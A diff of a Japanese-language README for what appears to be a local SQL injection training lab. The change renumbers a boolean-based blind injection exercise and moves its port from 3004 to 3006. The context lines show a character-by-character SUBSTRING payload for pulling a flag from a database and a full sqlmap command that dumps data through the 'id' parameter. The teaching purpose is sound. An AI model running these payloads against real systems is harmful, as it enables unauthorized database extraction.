@@ -1,6 +1,6 @@
-# 04 - Boolean-based Blind Injection
+# 06 - Boolean-based Blind Injection
 
-`http://localhost:3004` の`/api/user?id=`は`{"found": true/false}`しか返さない。
+`http://localhost:3006` の`/api/user?id=`は`{"found": true/false}`しか返さない。
 データは一切表示されない。それでもDB内のflagを1文字ずつ抜き出せ。
 
 ## ヒント
@@ -64,7 +64,7 @@ id=1 AND (SELECT SUBSTRING(flag,2,1) FROM flags)='L'   -> found:true
 
 sqlmapを使う場合:
 ```
-sqlmap -u "http://localhost:3004/api/user?id=1" --technique=B \
+sqlmap -u "http://localhost:3006/api/user?id=1" --technique=B \
   --string="found\":true" -p id --dump
 ```
 
